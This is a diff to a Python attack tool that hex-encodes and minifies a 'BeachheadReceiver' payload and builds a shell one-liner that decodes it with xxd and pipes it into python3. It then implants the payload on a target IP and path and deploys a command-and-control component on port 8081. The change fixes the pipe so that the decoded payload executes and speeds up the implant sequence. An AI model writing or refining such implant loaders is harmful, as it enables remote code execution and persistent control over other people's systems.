@@ -5,15 +5,16 @@ import binascii
 from base64 import b64encode
 import pathlib
 import time
+import python_minifier
 
 PARENT_DIR = str(pathlib.Path(__file__).parent.absolute()) + '/'
 BEACHHEAD_LOCATION = PARENT_DIR + 'include/BeachheadReceiver.py'
 
 def package_beachhead():
     with open(BEACHHEAD_LOCATION, 'r') as f:
-        receiver = f.read()
+        receiver = python_minifier.minify(f.read())
     hex_beachhead = binascii.hexlify(receiver.encode('utf-8')).decode('utf-8')
-    return "xxd -r -p <<< " + hex_beachhead + " || python3"
+    return "xxd -r -p <<< " + hex_beachhead + " | python3"
 
 def implant_beachhead(ip_addr, port, path):
     beachhead = package_beachhead()
@@ -35,7 +36,7 @@ if __name__ == '__main__':
     args = parser.parse_args()
 
     implant_beachhead(args.ip, args.port, args.path)
-    time.sleep(5)
+    time.sleep(1)
     
     implant_cnc(args.ip, "8081", args.path, args.implant)
     
